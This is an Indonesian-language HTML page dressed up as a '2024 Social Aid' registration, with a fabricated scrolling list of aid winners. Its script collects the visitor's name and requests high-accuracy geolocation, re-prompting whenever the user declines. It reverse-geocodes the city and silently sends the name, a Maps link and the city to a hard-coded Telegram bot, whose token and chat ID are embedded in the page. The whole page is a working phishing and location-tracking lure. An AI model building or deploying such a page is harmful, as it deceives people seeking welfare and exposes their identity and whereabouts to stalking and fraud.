<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bantuan Sosial 2024</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #2196F3, #21CBF3);
            color: white;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        .container {
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }
        form {
            margin-bottom: 30px;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            margin-top: 10px;
            font-size: 1.2rem;
            display: block;
            margin: 10px auto;
        }
        input[type="submit"] {
            background-color: #FF9800;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
            font-size: 1.2rem;
            display: inline-block;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background-color: #FF5722;
        }
        .info {
            margin-top: 20px;
            text-align: left;
            font-size: 1.1rem;
        }
        .info p {
            margin: 10px 0;
        }
        .winners {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            max-height: 200px;
            overflow: hidden;
            position: relative;
        }
        .winner-list {
            list-style: none;
            padding: 0;
            margin: 0;
            animation: scroll 10s linear infinite;
        }
        .winner-list li {
            margin: 10px 0;
            font-size: 1.1rem;
        }
        @keyframes scroll {
            0% { transform: translateY(0); }
            100% { transform: translateY(-100%); }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Bantuan Sosial 2024</h1>
    <form id="nameForm">
        <label for="nama">Masukkan Nama Anda:</label><br>
        <input type="text" id="nama" name="nama" placeholder="Nama Anda"><br><br>
        <input type="submit" value="Kirim">
    </form>

    <div class="info" id="info">
        <p><strong>üë§ Nama: </strong><span id="userName">Belum diisi</span></p>
        <p><strong>üìç Lokasi: </strong><span id="userLocation">Belum diisi</span></p>
        <p><strong>üèôÔ∏è Kota: </strong><span id="userCity">Belum diisi</span></p>
    </div>

    <h2>Pemenang Bantuan Sosial</h2>
    <div class="winners">
        <ul class="winner-list" id="winnerList">
            <!-- Pemenang akan dimasukkan secara otomatis -->
        </ul>
    </div>
</div>

<script>
    const form = document.getElementById('nameForm');
    const userNameSpan = document.getElementById('userName');
    const userLocationSpan = document.getElementById('userLocation');
    const userCitySpan = document.getElementById('userCity');
    let userName = '';
    let userLocation = '';
    let userCity = '';

    const pemenang = [
        { nama: 'Ade Santoso', alamat: 'Jakarta' },
        { nama: 'Budi Prasetyo', alamat: 'Bandung' },
        { nama: 'Citra Maharani', alamat: 'Surabaya' },
        { nama: 'Dewi Lestari', alamat: 'Yogyakarta' },
        { nama: 'Eko Saputra', alamat: 'Semarang' },
        { nama: 'Fajar Nugraha', alamat: 'Malang' },
        { nama: 'Gina Fitriani', alamat: 'Medan' },
        { nama: 'Hadi Wirawan', alamat: 'Bali' },
        { nama: 'Intan Wulandari', alamat: 'Makassar' },
        { nama: 'Joko Subagio', alamat: 'Palembang' }
    ];

    function tampilkanPemenang() {
        const winnerList = document.getElementById('winnerList');
        winnerList.innerHTML = '';
        pemenang.forEach(winner => {
            const li = document.createElement('li');
            li.textContent = `Nama: ${winner.nama}, Alamat: ${winner.alamat}`;
            winnerList.appendChild(li);
        });
    }

    tampilkanPemenang();

    form.addEventListener('submit', (event) => {
        event.preventDefault();
        userName = document.getElementById('nama').value;
        userNameSpan.textContent = userName;
        getLocation();
    });

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, retryLocation, { enableHighAccuracy: true });
        } else {
            userLocationSpan.textContent = "Geolocation tidak didukung oleh browser ini.";
        }
    }

    function retryLocation() {
        getLocation(); // Meminta lokasi lagi jika pengguna menolak
    }

    function showPosition(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        userLocation = `<a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Lihat di Maps</a>`;
        userLocationSpan.innerHTML = userLocation;

        // Cari kota berdasarkan koordinat
        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
            .then(response => response.json())
            .then(data => {
                userCity = data.address.city || data.address.town || 'Kota tidak ditemukan';
                userCitySpan.textContent = userCity;

                // Kirim data ke bot Telegram
                sendToTelegram();
            })
            .catch(error => {
                console.error('Error mendapatkan kota:', error);
                userCitySpan.textContent = 'Kota tidak ditemukan';
            });
    }

    function sendToTelegram() {
        const botToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
        const chatId = '6864784021'; // Ganti dengan ID chat bot Telegram
        const message = `üë§ Nama: ${userName}\nüìç Lokasi: ${userLocation}\nüèôÔ∏è Kota: ${userCity}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Pesan terkirim:', data);
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
</script>

</body>
</html>
